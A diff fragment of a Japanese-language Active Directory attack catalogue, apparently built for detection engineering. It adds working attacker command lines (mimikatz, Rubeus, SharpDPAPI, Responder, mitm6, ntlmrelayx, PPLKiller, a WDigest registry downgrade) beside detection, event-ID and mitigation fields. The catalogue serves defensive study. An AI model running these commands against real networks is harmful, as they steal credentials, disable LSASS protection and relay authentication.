     "how": "前提: 対象gMSAのmsDS-GroupMSAMembership(PrincipalsAllowedToRetrieveManagedPassword)に含まれるアカウント権限。LDAPで msDS-ManagedPassword を読み、MSDS-MANAGEDPASSWORD_BLOB をパースしてNTLMハッシュ/AES鍵を計算。gMSADumper.py, GMSAPasswordReader.exe, DSInternals(Get-ADReplAccount等)。※Get-ADServiceAccountはRSATのADモジュールコマンド。得たハッシュでOverpass-the-Hash/サービスなりすまし。BloodHoundのReadGMSAPassword edgeで委任先を特定。",
     "tools": "gMSADumper.py, GMSAPasswordReader, DSInternals, NetExec --gmsa, BloodHound",
+    "cmd": [
+      {
+        "tool": "PowerShell",
+        "t": "gMSAの現行パスワードblobを取得。`msDS-ManagedPassword` の読み取り要求が主軸",
+        "q": "Get-ADServiceAccount -Identity gmsa01 -Properties msDS-ManagedPassword"
+      },
+      {
+        "tool": "GMSAPasswordReader",
+        "t": "blobからNTLMハッシュへ変換する専用ツール。取得直後のPass-the-Hashに直結する",
+        "q": "GMSAPasswordReader.exe --accountname gmsa01"
+      },
+      {
+        "tool": "gMSADumper",
+        "t": "Linux側から読み取り可能なgMSAを総なめ。DCのLDAP監査でしか見えない",
+        "q": "gMSADumper.py -u svc_user -p 'Passw0rd!' -d corp.local"
+      },
+      {
+        "tool": "NetExec",
+        "t": "読み取り権限のあるgMSAを一括列挙。`--gmsa` はLDAPS必須なので636への接続を伴う",
+        "q": "netexec ldap 10.0.0.10 -u svc_user -p 'Passw0rd!' --gmsa"
+      },
+      {
+        "tool": "bloodyAD",
+        "t": "汎用LDAPクライアントでの属性読み。PrincipalsAllowedToRetrieve側の改ざんと合わせて追う",
+        "q": "bloodyAD -d corp.local -u svc_user -p 'Passw0rd!' --host 10.0.0.10 get object 'gmsa01$' --attr msDS-ManagedPassword"
+      }
+    ],
     "detect": "msDS-ManagedPassword属性へのLDAP読取(4662)。想定外プリンシパルによる取得。ネットワーク側でLDAPS経由のgMSA blob要求を相関。BloodHoundでReadGMSAPassword保有者を監査。",
     "events": "4662(属性アクセス), 4624",
     "mitigate": "PrincipalsAllowedToRetrieveManagedPasswordを最小限のホスト/サービスに限定し定期棚卸し。gMSAを付与したホスト自体の保護(Tier分離)。異常な取得の監査SACL設定。",
@@ -1347,6 +2254,33 @@ AD.I18N.ja.attacks = [
     "summary": "DPAPIで保護されたユーザ資格情報(Credential Managerのblob、RDP、スケジュールタスク等)を、マスターキーを復号して平文化する。",
     "how": "前提: 対象ユーザセッションまたはローカル管理者/DA。ユーザ側: %APPDATA%\\Microsoft\\Protect\\<SID>\\ のマスターキーをユーザパスワード/ハッシュで復号(mimikatz dpapi::masterkey /sid /password or /rpc)。管理者側: LSASSからDPAPIマスターキー抽出(sekurlsa::dpapi)。ドメイン全体: DC上のDPAPIバックアップキー(domain backup key)を lsadump::backupkeys で入手すれば全ユーザのマスターキーを復号可能。復号対象は %APPDATA%\\Microsoft\\Credentials\\ のCredentialファイル。SharpDPAPIで自動化。",
     "tools": "mimikatz dpapi::*/sekurlsa::dpapi/lsadump::backupkeys, SharpDPAPI, DonPAPI, impacket dpapi.py",
+    "cmd": [
+      {
+        "tool": "Mimikatz",
+        "t": "DCへのRPCでマスターキーを復号。`dpapi::masterkey` と `/rpc` の同居が高信頼",
+        "q": "mimikatz.exe \"privilege::debug\" \"dpapi::masterkey /in:C:\\Users\\svc_user\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-x\\GUID /rpc\" exit"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "復号済みマスターキーで資格情報blobを開く。`dpapi::cred` が観測文字列",
+        "q": "mimikatz # dpapi::cred /in:C:\\Users\\svc_user\\AppData\\Roaming\\Microsoft\\Credentials\\ABCD1234"
+      },
+      {
+        "tool": "SharpDPAPI",
+        "t": "C#実装での一括収集。`machinemasterkeys` はSYSTEM権限前提なので昇格済みの裏付けになる",
+        "q": "SharpDPAPI.exe credentials /pvk:C:\\Windows\\Temp\\domain_backupkey.pvk"
+      },
+      {
+        "tool": "Impacket",
+        "t": "持ち出したblobをLinux側で復号。標的側ログは無く、直前のProtect/Credentialsフォルダ読み取りで見る",
+        "q": "dpapi.py masterkey -file GUID -sid S-1-5-21-x -password 'Passw0rd!'"
+      },
+      {
+        "tool": "DonPAPI",
+        "t": "リモート多数ホストからDPAPI保護データを横断収集。SMB接続の扇状展開を伴う",
+        "q": "donpapi collect -d corp.local -u svc_user -p 'Passw0rd!' -t 10.0.0.0/24"
+      }
+    ],
     "detect": "%APPDATA%\\Microsoft\\Protect および \\Credentials へのアクセス(Sysmon11/4663)。DCでのDPAPIバックアップキー取得はDRSUAPI/LSA経由の異常操作として相関。SharpDPAPI/mimikatz実行痕跡。",
     "events": "4663/Sysmon 11, Sysmon 10(LSASS), 4104",
     "mitigate": "Credential Guardで一部保護。DC上のDPAPIドメインバックアップキーはTier0で厳格保護(奪取=全ユーザ復号)。Credential Managerに機微資格情報を保存しない運用。ホスト侵害・管理者奪取自体の抑止。",
@@ -1382,6 +2316,28 @@ AD.I18N.ja.attacks = [
     "summary": "Chromium系ブラウザの保存パスワード・Cookieを、DPAPIで暗号化されたAES状態鍵(Local State)を復号して平文化・セッション窃取する。",
     "how": "前提: 対象ユーザコンテキストまたはローカル管理者。%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State のencrypted_keyをDPAPIで復号しAES-GCM鍵を取得、Login Data/Cookies(SQLite)のv10/v11 blobを復号。SharpChrome, DonPAPI, LaZagne, HackBrowserData。Chrome App-Bound Encryption(v20)導入環境では追加でIElevator COM経由の復号手法が必要。Cookie窃取でMFAバイパス(セッション乗っ取り)。",
     "tools": "SharpChrome, LaZagne, HackBrowserData, DonPAPI, mimikatz dpapi::chrome",
+    "cmd": [
+      {
+        "tool": "SharpChrome",
+        "t": "Chromium系のログイン情報/Cookieを復号。`logins` `cookies` サブコマンドが観測文字列",
+        "q": "SharpChrome.exe logins /unprotect"
+      },
+      {
+        "tool": "SharpChrome",
+        "t": "Cookie一括抽出。セッション乗っ取り目的でありMFA迂回に直結するため重大度が高い",
+        "q": "SharpChrome.exe cookies /showall /format:json"
+      },
+      {
+        "tool": "LaZagne",
+        "t": "ブラウザ含む多数のソフトから資格情報を総なめ。単一プロセスが多数の資格情報ファイルを開く挙動が出る",
+        "q": "laZagne.exe browsers -oN"
+      },
+      {
+        "tool": "chrome.exe",
+        "t": "App-Bound Encryption導入後に増えた迂回経路。稼働中ブラウザにデバッグポートを開いてCookieを引き出す",
+        "q": "chrome.exe --headless --remote-debugging-port=9222 --user-data-dir=\"C:\\Users\\svc_user\\AppData\\Local\\Google\\Chrome\\User Data\""
+      }
+    ],
     "detect": "ブラウザプロファイル(Login Data/Cookies/Local State)への非ブラウザプロセスからのアクセス(Sysmon11/4663)。LaZagne等の実行。異常な地理/端末からのセッション再利用(IdP側)。 ABE(App-Bound Encryption)バイパスの検知: 非ブラウザプロセスによるブラウザのIElevator COM昇格サービスへのCLSIDベースのアクティベーション(例: ChromeのCLSID {708860E0-F641-4611-8895-7D867DD3675B}、DecryptDataメソッド呼び出し)——正規にはブラウザ本体プロセスのみが呼ぶため、dllhost.exeや不審バイナリからの生成は強い異常シグナル。より巧妙な手口はIElevatorのパス検証を回避するためchrome.exe/msedge.exe自体にDLLをインジェクションしその内部から呼び出すため、chrome.exe/msedge.exeへの非ブラウザプロセスからのクロスプロセスメモリ読み取り・ハンドルオープン(PROCESS_VM_READ等、Sysmon 10 ProcessAccess)、CreateRemoteThread/LoadLibrary系の痕跡も検知対象とする。復号済み平文をブラウザプロセスメモリから直接スクレイピングする手口(メモリダンプ)にも同様の監視が有効。",
     "events": "4663/Sysmon 11, 4688, IdP認証ログ, Sysmon 10(ProcessAccess, TargetImage=chrome.exe/msedge.exe), Sysmon 1(elevation:Administrator!new:{CLSID}を含むCOMアクティベーションのCommandLine), Sysmon 11/23(Login Data/Cookies/Local State等の作成・削除), MDE DeviceEvents(ActionType=OpenProcessApiCall)",
     "mitigate": "App-Bound Encryption(Chrome127+)は前提防御だが、IElevator COMの悪用・COMハイジャックによる旧DPAPI暗号へのダウングレード・ブラウザプロセスへのインジェクションで主要スティーラー(Lumma/StealC/Vidar/Glove/VoidStealer等)が常態的にバイパスするため単独では不十分。EDRでブラウザ機密ファイル(Login Data/Cookies/Local State)への非ブラウザプロセスのアクセスを監視・ブロック。Cookie窃取後のセッション乗っ取りはIdP側の対策が本命——トークンバインディング/継続的アクセス評価(CAE)/短命セッション/Device Bound Session Credentials(DBSC)でCookie再利用を無効化。特権者のブラウザ資格情報・Cookie保存を禁止しPAW運用に限定。",
@@ -1427,6 +2383,23 @@ AD.I18N.ja.attacks = [
     "summary": "WDigestを再有効化(UseLogonCredential=1)してLSASSに平文パスワードをキャッシュさせ、次回ログオン以降の平文を回収する。",
     "how": "前提: ローカル管理者。reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 を設定。ユーザの再ログオン後にmimikatz sekurlsa::wdigestで平文取得。既定で無効化(Win8.1/2012R2以降)された機能を意図的にダウングレードする永続化兼資格情報奪取手法。",
     "tools": "reg.exe, mimikatz sekurlsa::wdigest",
+    "cmd": [
+      {
+        "tool": "reg.exe",
+        "t": "WDigestの平文保持を再有効化する古典。`UseLogonCredential` に1を書く操作はまず正規運用に無い",
+        "q": "reg.exe add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "同じ改ざんをPowerShellで行う変種。reg.exe名の検知をすり抜けるため4104と併せて見る",
+        "q": "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' -Name UseLogonCredential -Value 1"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "有効化後に平文を回収する側。`sekurlsa::wdigest` の出現は改ざんとセットで追う",
+        "q": "mimikatz.exe \"privilege::debug\" \"sekurlsa::wdigest\" exit"
+      }
+    ],
     "detect": "UseLogonCredentialレジストリ値の1への変更(Sysmon13/4657)。WDigest関連キー改変を高疑アラート化。",
     "events": "Sysmon 13, 4657, 4688",
     "mitigate": "GPO/レジストリでUseLogonCredential=0を強制配布し改変を監視。Credential Guardで平文キャッシュ自体を防止。レジストリ改変のEDRブロック。",
@@ -1462,6 +2435,28 @@ AD.I18N.ja.attacks = [
     "summary": "RunAsPPL(Protected Process Light)で保護されたLSASSを、脆弱ドライバや既知バイパスで無防備化してからメモリをダンプする。",
     "how": "前提: ローカル管理者。PPL保護環境で通常のダンプが失敗する場合、PPLdump(既知のPPLバイパス)でlsassをダンプ、またはmimikatz !+/!processprotect(mimidrvドライバ)でPPL属性を解除、あるいはBYOVD(脆弱な署名ドライバをロードしカーネルからLSASSアクセス)。以降は通常のダンプ+pypykatz解析。Credential Guard未導入のPPLのみ環境が主対象。",
     "tools": "PPLdump, PPLKiller, mimidrv(mimikatz), BYOVD(各種脆弱ドライバ)",
+    "cmd": [
+      {
+        "tool": "PPLdump",
+        "t": "ユーザーランド脆弱性でPPL保護のlsass.exeを直接ダンプ。`PPLdump.exe`のプロセス生成と`.dmp`書き込みが唯一の痕跡",
+        "q": "PPLdump.exe lsass.exe C:\\Windows\\Temp\\lsass.dmp"
+      },
+      {
+        "tool": "PPLKiller",
+        "t": "カーネルドライバを導入しLSA Protectionを全プロセスから解除。ドライバサービス作成の7045が決定的",
+        "q": "PPLKiller.exe /installDriver\nPPLKiller.exe /disableLSAProtection"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "mimidrv.sysをロードしlsassのPS_PROTECTIONフラグを除去してから通常ダンプ。`!+`と`!processprotect`の文字列が残る",
+        "q": "mimikatz.exe \"privilege::debug\" \"!+\" \"!processprotect /process:lsass.exe /remove\" \"sekurlsa::logonpasswords\" exit"
+      },
+      {
+        "tool": "sc.exe",
+        "t": "BYOVD共通の前段階。署名済み脆弱ドライバ(例RTCore64.sys)をカーネルサービスとして登録・起動する",
+        "q": "sc.exe create RTCore64 type= kernel binPath= C:\\Windows\\Temp\\RTCore64.sys start= demand\nsc.exe start RTCore64"
+      }
+    ],
     "detect": "脆弱ドライバのロード(Sysmon6, DriverLoad)。未署名/既知悪性ドライバのService作成(7045)。PPL属性変更やカーネル経由の異常なLSASSアクセス。Microsoft脆弱ドライバブロックリスト違反。",
     "events": "Sysmon 6, 7045, Sysmon 10, 4688",
     "mitigate": "Credential Guard(VBS)導入でPPL単体より強固に保護。Microsoft Vulnerable Driver Blocklist / WDACで脆弱ドライバのロードを遮断。HVCI(メモリ整合性)有効化。EDRのドライバ監視。",
@@ -1502,6 +2497,38 @@ AD.I18N.ja.attacks = [
     "summary": "LSASSメモリから現在ログオン中ユーザのKerberos TGT/TGSチケットやAES鍵を抽出し、Pass-the-Ticket/なりすましに利用する。",
     "how": "前提: ローカル管理者(SeTcbPrivilege/SeDebug)。mimikatz sekurlsa::tickets /export で.kirbiチケットを書き出し、sekurlsa::ekeysでAES256鍵を取得。Rubeus dump / triageで同様に抽出。得たTGTを別ホストでPass-the-Ticket(Rubeus ptt / mimikatz kerberos::ptt)して横展開。ローカル管理者のセッションに他ユーザ(管理者)チケットが残っていれば権限昇格に直結。",
     "tools": "mimikatz sekurlsa::tickets/ekeys, Rubeus dump/triage/ptt",
+    "cmd": [
+      {
+        "tool": "Mimikatz",
+        "t": "LSASSメモリ上のKerberosチケットを.kirbiファイルへ一括書き出し。拡張子`.kirbi`の生成が主要な痕跡",
+        "q": "mimikatz.exe \"sekurlsa::tickets /export\" exit"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "セッション鍵(AES256/RC4)を直接抽出しPtT/PtKへ転用。`ekeys`はチケットダンプより検知シグネチャが薄い",
+        "q": "mimikatz.exe \"sekurlsa::ekeys\" exit"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "LSASSから全チケットをbase64で抽出しディスクに残さない。`dump`と`/nowrap`が主要な検知トークン",
+        "q": "Rubeus.exe dump /nowrap"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "キャッシュ済みチケットを軽量に一覧化する偵察。低ノイズだが直後のptt/dumpと相関させると強いシグナル",
+        "q": "Rubeus.exe triage"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "窃取したTGTを自セッションへ注入しなりすまし横展開。`/ticket:`直後の長いbase64が異常な4624を伴う",
+        "q": "Rubeus.exe ptt /ticket:BASE64_TICKET_HERE"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "kirbiファイルを直接注入するPass-the-Ticket。`kerberos::ptt`と`.kirbi`拡張子の組み合わせが手掛かり",
+        "q": "mimikatz.exe \"kerberos::ptt ticket.kirbi\" exit"
+      }
+    ],
     "detect": "Sysmon10のLSASSアクセス。異常ホストからの同一TGT再利用(4768/4769の地理・端末不一致)。Pass-the-Ticket特有のログオン(4624 Type3, チケット暗号化種別の不整合)。",
     "events": "Sysmon 10, 4768, 4769, 4624",
     "mitigate": "Credential Guardでチケット/鍵をVSMに隔離。RunAsPPL。特権チケットの寿命短縮(TGT lifetime)。管理者の対話ログオンをPAWに限定しチケット残留を防ぐ。異常再利用のSIEM検知。",
@@ -1537,6 +2564,33 @@ AD.I18N.ja.attacks = [
     "summary": "Windows Credential Manager(Vault)に保存された汎用/ドメイン資格情報・RDP保存資格情報を列挙・復号して窃取する。",
     "how": "前提: 対象ユーザコンテキストまたは管理者。cmdkey /list で保存資格情報を列挙、mimikatz vault::list / vault::cred でVaultを復号、SharpDPAPIやLaZagneで自動抽出。Web資格情報やRDP接続の保存パスワードが対象。ユーザ操作でsaved RDP(.rdp+DPAPI blob)も復号可能。",
     "tools": "cmdkey, mimikatz vault::cred, SharpDPAPI, LaZagne",
+    "cmd": [
+      {
+        "tool": "cmdkey.exe",
+        "t": "保存済み汎用/ドメイン資格情報とRDP接続を列挙する偵察。単体は正規運用と区別しづらく後続の復号ツールと相関させる",
+        "q": "cmdkey.exe /list"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "Vaultのエントリを列挙。`vault::list`は復号前の下見として使われる",
+        "q": "mimikatz.exe \"vault::list\" exit"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "Credential Managerを復号し保存RDP/Web資格情報を平文取得。`vault::cred`が決定的シグナル",
+        "q": "mimikatz.exe \"vault::cred\" exit"
+      },
+      {
+        "tool": "SharpDPAPI",
+        "t": "現在ユーザのDPAPIマスターキー鎖でWindows Vaultを自動復号。`vaults`サブコマンドが特徴的",
+        "q": "SharpDPAPI.exe vaults"
+      },
+      {
+        "tool": "LaZagne",
+        "t": "windowsカテゴリでVault/Credman等を一括抽出。複数モジュールの短時間連続実行がノイズになり検知しやすい",
+        "q": "lazagne.exe windows"
+      }
+    ],
     "detect": "Vault関連ファイル(%APPDATA%\\Microsoft\\Vault, \\Credentials)へのアクセス(Sysmon11/4663)。cmdkey /list実行、mimikatz vault痕跡。",
     "events": "4663/Sysmon 11, 4688",
     "mitigate": "特権/共有資格情報をVaultに保存させない運用。RDP資格情報保存の無効化(GPO: Do not allow passwords to be saved)。Credential Guard、EDR監視。",
@@ -1572,6 +2626,33 @@ AD.I18N.ja.attacks = [
     "summary": "レジストリのWinlogon自動ログオン設定や、無人インストールファイル・スクリプト内に平文で残る資格情報を回収する。",
     "how": "前提: ローカル管理者またはレジストリ/ファイル読取権限。reg query 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' でDefaultPassword/DefaultUserName/AutoAdminLogonを確認(平文または前述のLSA secretsに格納)。加えて C:\\Windows\\Panther\\unattend.xml, sysprep.inf, Autounattend.xml, GPP以外の各種スクリプト(.ps1/.bat)、IISのweb.config connectionStrings を横断検索。",
     "tools": "reg query, findstr /si password *.xml *.ini *.txt, PowerUp, Seatbelt, LaZagne",
+    "cmd": [
+      {
+        "tool": "reg.exe",
+        "t": "Winlogonキーの自動ログオン設定を照会し平文パスワードを取得。`DefaultPassword`値の読取が決定的",
+        "q": "reg.exe query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword"
+      },
+      {
+        "tool": "findstr.exe",
+        "t": "ファイル横断で`password`文字列を検索するLOLBin偵察。誤検知は多いが対象拡張子で絞れる",
+        "q": "findstr.exe /si password *.xml *.ini *.txt *.config"
+      },
+      {
+        "tool": "findstr.exe",
+        "t": "無人インストール残骸を直接標的化。Pantherフォルダの`Unattend.xml`読取は正規運用でまず発生しない",
+        "q": "findstr.exe /si password C:\\Windows\\Panther\\Unattend.xml C:\\Windows\\System32\\Sysprep\\sysprep.xml"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "PowerUpのレジストリ自動ログオン/無人インストール検査関数。4104に関数名がそのまま残る",
+        "q": "Get-RegistryAutoLogon\nGet-UnattendedInstallFile"
+      },
+      {
+        "tool": "Seatbelt",
+        "t": "自動ログオン専用チェックを単体実行。プロセス引数の`WindowsAutoLogon`が固有の文字列",
+        "q": "Seatbelt.exe WindowsAutoLogon"
+      }
+    ],
     "detect": "Winlogonキー(DefaultPassword)へのアクセス。Panther/sysprep残存ファイルへのアクセス。findstr password 等の資格情報探索コマンドライン(4688/Sysmon1)。",
     "events": "4688/Sysmon 1, 4663, Sysmon 13",
     "mitigate": "自動ログオン(AutoAdminLogon)の廃止。展開後にunattend/sysprep残骸を削除(build cleanup)。スクリプト/構成ファイルへの平文資格情報埋め込み禁止、資格情報保管庫の利用。定期的なファイルシステム資格情報スキャン。",
@@ -1607,6 +2688,38 @@ AD.I18N.ja.attacks = [
     "summary": "名前解決の失敗時に流れるLLMNR/NBT-NSブロードキャストに偽応答し、被害者のNTLMv1/v2認証(Net-NTLMハッシュ)を奪取する中間者攻撃。",
     "how": "同一ブロードキャストドメインに立ち、Responder等でLLMNR(UDP5355)/NBT-NS(UDP137)問い合わせに自分のIPを返す。被害者がタイポや存在しない共有(\\\\srv01)へアクセスするとSMB/HTTP認証が誘発され、Net-NTLMv2ハッシュを取得。取得ハッシュはhashcatでオフラインクラック、またはSMB署名無効ホストへリレー。前提はL2到達性とLLMNR/NBT-NSが有効なこと。",
     "tools": "Responder (-I eth0 -wv), Inveigh (PowerShell/C#), hashcat -m 5600, ntlmrelayx",
+    "cmd": [
+      {
+        "tool": "Responder",
+        "t": "LLMNR/NBT-NS/mDNSに偽応答しNet-NTLMv2を奪取。Linux攻撃機上で完結しプロセスログは残らず被害者側SMB/HTTP認証とDCの4776で追う",
+        "q": "python3 Responder.py -I eth0 -wv"
+      },
+      {
+        "tool": "Responder",
+        "t": "偽応答せず名前解決要求だけを観測する`-A`偵察モード。攻撃直前のブロードキャスト調査として使われることが多い",
+        "q": "python3 Responder.py -I eth0 -A -v"
+      },
+      {
+        "tool": "Inveigh",
+        "t": "侵害済みWindows端末上でPowerShellのままLLMNR/NBNSを毒化。4104スクリプトブロックに`Invoke-Inveigh`と`-NBNS Y`が残る",
+        "q": "Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y"
+      },
+      {
+        "tool": "Inveigh",
+        "t": "C#移植版バイナリでの同等動作。4688プロセス生成に`Inveigh.exe`と引数文字列がそのまま残りEDRの実行系検知に掛かりやすい",
+        "q": "Inveigh.exe -ConsoleOutput Y -NBNS Y -LLMNR Y"
+      },
+      {
+        "tool": "Hashcat",
+        "t": "奪取したNet-NTLMv2をオフラインクラック。モード5600の実行自体がLLMNR/NBT-NSポイズニング成立の裏付けになる",
+        "q": "hashcat -m 5600 -a 0 hashes.txt rockyou.txt"
+      },
+      {
+        "tool": "ntlmrelayx",
+        "t": "捕捉で終わらせず即時中継に回す運用。DC側で初回認証がリレー先ログに残り単体Responder運用より痕跡が分散する",
+        "q": "ntlmrelayx.py -tf targets.txt -smb2support"
+      }
+    ],
     "detect": "自ホストからLLMNR/NBT-NS偽応答を注入する検知用ハニークライアント(存在しないホスト名の名前解決を定期発行し応答が返るか監視)が有効。SMB/HTTPで想定外ホストへの認証試行、短時間に多数のNet-NTLM認証を受けるホストを監視。",
     "events": "Sysmon 22 (DNSQuery異常), Security 4624/4625 (NTLM logon), ネットワークセンサでのLLMNR/NBT-NS応答検知",
     "mitigate": "GPOでLLMNRを無効化(HKLM\\...\\DNSClient EnableMulticast=0)、NetBIOS over TCP/IPを無効化(DHCPオプションまたはNIC設定)。正しい内部DNS運用でフォールバックを排除。SMB署名必須化でリレー先を潰す。",
@@ -1642,6 +2755,28 @@ AD.I18N.ja.attacks = [
     "summary": "Apple Bonjour等で使われるmDNS(.local)の名前解決に偽応答し、LLMNR同様に認証を奪取する亜種。",
     "how": "224.0.0.251:5353宛のmDNSクエリをResponderで傍受・偽応答し、.localホスト名解決を乗っ取る。混在環境(Mac/IoT/プリンタ)で特に有効。LLMNR/NBT-NSが無効化された環境でも残存しがちな見落とされやすい経路。取得したNet-NTLMをクラックまたはリレー。",
     "tools": "Responder (-m有効), Inveigh",
+    "cmd": [
+      {
+        "tool": "Responder",
+        "t": "既定で`MDNS = On`のためmDNS(UDP5353/.local)にもLLMNR/NBT-NSと同じ応答ロジックを流用。Responder.confの設定が有効化条件",
+        "q": "python3 Responder.py -I eth0 -v"
+      },
+      {
+        "tool": "Responder",
+        "t": "偽応答せず.local宛mDNSクエリの発生元だけ観測。LLMNR/NBT-NS無効化済み環境で残存経路を洗い出す偵察に使われる",
+        "q": "python3 Responder.py -I eth0 -A -v"
+      },
+      {
+        "tool": "Inveigh",
+        "t": "侵害端末上でmDNSのみ選択的に毒化。4104に`-mDNS Y`のパラメータ文字列が残りLLMNR/NBT-NS無効環境の抜け道になる",
+        "q": "Invoke-Inveigh -mDNS Y -LLMNR N -NBNS N -ConsoleOutput Y"
+      },
+      {
+        "tool": "Hashcat",
+        "t": "mDNS経由でもNet-NTLMv2形式は同一。モード5600でオフラインクラックしプレーンテキストを得る",
+        "q": "hashcat -m 5600 -a 0 mdns_hashes.txt rockyou.txt"
+      }
+    ],
     "detect": "セグメント内のmDNS(UDP5353)応答パターン監視、想定外デバイスからのmDNS大量応答。ハニークライアントによる.local名解決テスト。",
     "events": "ネットワークIDSのmDNSシグネチャ, 4624/4625",
     "mitigate": "不要ならファイアウォールでUDP5353を遮断、mDNSレスポンダサービス停止。セグメント分離でIoT/クライアントをAD認証系から隔離。",
@@ -1672,6 +2807,28 @@ AD.I18N.ja.attacks = [
     "summary": "ブラウザ/OSが自動発見するWPADプロキシ名を名前解決ポイズニングで乗っ取り、全HTTPトラフィックの傍受とNTLM認証強制を行う。",
     "how": "「WPAD」ホスト名をLLMNR/NBT-NS/DNSで偽応答し、悪意のwpad.datを配布。プロキシ経由化されたHTTPリクエストに対し407 Proxy Authentication Requiredを返すとブラウザが自動でNTLM認証を送出し、ユーザー操作なしにNet-NTLM奪取が可能。ntlmrelayxのWPAD/プロキシ機能と組合せる。",
     "tools": "Responder (WPAD/proxy-auth), ntlmrelayx (--wpad-host)",
+    "cmd": [
+      {
+        "tool": "Responder",
+        "t": "WPADホスト名への問い合わせに偽応答し不正プロキシを起動。`-w`起動と直後の407強制応答が最初の目印",
+        "q": "python3 Responder.py -I eth0 -wF"
+      },
+      {
+        "tool": "Responder",
+        "t": "プロキシ経由の全HTTPに407 Proxy Authentication Requiredを強制しユーザー操作なしでNTLM送出させる。`-w`とは併用不可の単独オプション",
+        "q": "python3 Responder.py -I eth0 -P -v"
+      },
+      {
+        "tool": "Responder",
+        "t": "DHCPv4応答にWPAD設定を注入する能動モード。正規DHCPサーバ以外からの応答としてDHCPスヌーピング/監査ログで検知できる",
+        "q": "python3 Responder.py -I eth0 -d -w"
+      },
+      {
+        "tool": "ntlmrelayx",
+        "t": "偽WPADホストを名乗り誘導したNTLM認証を別プロトコルへ中継。`--wpad-host`に指定した架空FQDNがDNSクエリログに残る",
+        "q": "ntlmrelayx.py -t ldap://10.0.0.10 --wpad-host fakewpad.corp.local -smb2support"
+      }
+    ],
     "detect": "WPADホストの名前解決要求と応答元の乖離、想定外プロキシ設定、Proxy-Authenticate 407を伴うNTLM。",
     "events": "4624/4625, プロキシ/Webフィルタログ",
     "mitigate": "MS16-077適用(WPADのNTLM自動認証を無効化しHTTPでの名前解決を排除)。DNSに正当なwpadレコードを登録(またはGPOでWPAD無効化)、ブラウザの自動プロキシ検出を無効化。",
@@ -1707,6 +2864,28 @@ AD.I18N.ja.attacks = [
     "summary": "Windowsが既定でIPv6を優先する挙動を悪用し、悪意のDHCPv6応答で自分をDNSサーバに設定させ、名前解決を全掌握してNTLMリレーへ繋ぐ。",
     "how": "mitm6でDHCPv6 Solicit/Requestに応答し、被害者にリンクローカルIPv6 DNS(=攻撃者)を割当。WPADや任意FQDNの解決を乗っ取り、ntlmrelayxでLDAP/LDAPSへリレー。無操作でもマシンアカウント認証が定期的に飛ぶため強力。典型はmitm6 + ntlmrelayx -6 --delegate-access でRBCD確立。前提はIPv6がクライアントで有効(既定有効)なこと。",
     "tools": "mitm6 (-d domain.local), ntlmrelayx.py -6 -t ldaps://dc --delegate-access",
+    "cmd": [
+      {
+        "tool": "mitm6",
+        "t": "偽DHCPv6応答で被害者のDNSを攻撃者のIPv6リンクローカルへ設定させる。DHCPv6 Solicit/Advertiseの異常な応答元として観測できる",
+        "q": "mitm6 -d corp.local"
+      },
+      {
+        "tool": "ntlmrelayx",
+        "t": "mitm6が奪ったDNSでWPAD名前解決を乗せ替え、飛んできたマシン認証をLDAPSへ中継しRBCDを確立。`-6`はIPv6リスナー有効化の目印",
+        "q": "ntlmrelayx.py -6 -t ldaps://10.0.0.10 -wh fakewpad.corp.local -l loot --delegate-access"
+      },
+      {
+        "tool": "mitm6",
+        "t": "FQDNを含まないDHCPv6要求を無視し対象を絞り込む運用。無差別より検知が難しく特定端末狙いの横展開フェーズで使われる",
+        "q": "mitm6 -d corp.local -i eth0 --ignore-nofqdn"
+      },
+      {
+        "tool": "ntlmrelayx",
+        "t": "着弾したマシン認証をSMBへ中継しハッシュを直接窃取する代替経路。DC以外の端末からの445集中がLDAPリレーより気付かれやすい",
+        "q": "ntlmrelayx.py -6 -t smb://10.0.0.20 -wh fakewpad.corp.local -dh"
+      }
+    ],
     "detect": "正規でないDHCPv6サーバの出現、クライアントのDNSサーバがfe80::系リンクローカルに変わる、大量の動的DNS更新失敗。",
     "events": "DHCPサーバ/スイッチのDHCPv6ガードログ, 4624 (NTLM, マシンアカウント), 5136 (RBCD属性変更)",
     "mitigate": "IPv6を安易に無効化せず、スイッチでRA Guard/DHCPv6 Guardを有効化して不正なRA/DHCPv6応答を遮断。WPAD DNSエントリを正規IPで固定登録(またはGPOでWPAD無効化)し攻撃の起点を潰す。リレー先の無力化が本命:mitm6はLDAP署名を回避するためLDAPS(636)へリレーするので、LDAP署名だけでなくLDAPチャネルバインディング(EPA)の必須化が決め手。Windows Server 2025のDCは既定でLDAP署名を強制(Require Signing)するようになったが、LDAPチャネルバインディングは強制されない——新規インストールでも既定は『サポートされる場合(When supported)』にとどまり、CBTを送らないリレー接続は素通りする。GPO『ドメインコントローラー: LDAPサーバーチャネルバインディングトークン要件』を『常に(Always)』に設定して初めてLDAPSリレーを封じられる(2024-2025更新で段階展開可)。",
@@ -1747,6 +2926,33 @@ AD.I18N.ja.attacks = [
     "summary": "奪取したNTLM認証を別ホストのSMBへ中継し、認証してコマンド実行/SAMダンプ/ファイルアクセスを行う古典的リレー。",
